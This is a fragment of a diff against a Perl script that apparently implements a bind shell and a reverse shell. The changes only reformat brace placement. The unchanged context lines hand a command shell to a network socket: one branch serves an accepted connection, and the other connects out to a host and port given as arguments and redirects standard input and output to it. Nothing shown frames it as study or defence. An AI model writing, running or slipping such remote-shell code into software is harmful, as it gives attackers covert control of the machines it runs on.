@@ -17,9 +17,7 @@ if(@ARGV==1){
         exec $sh||die();
         close(C);close(S);close(STDIN);close(STDOUT);close(STDERR);
         exit 0;
-
-}
-elsif(@ARGV==2){
+}elsif(@ARGV==2){
         $p=$ARGV[0];
         $h=$ARGV[1];
         $i=inet_aton($h)||die();
@@ -29,5 +27,4 @@ elsif(@ARGV==2){
         open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
         exec $sh||die();
         close(S);close(STDIN);close(STDOUT);close(STDERR);
-}
-else{exit(1);}
+}else{exit(1);}
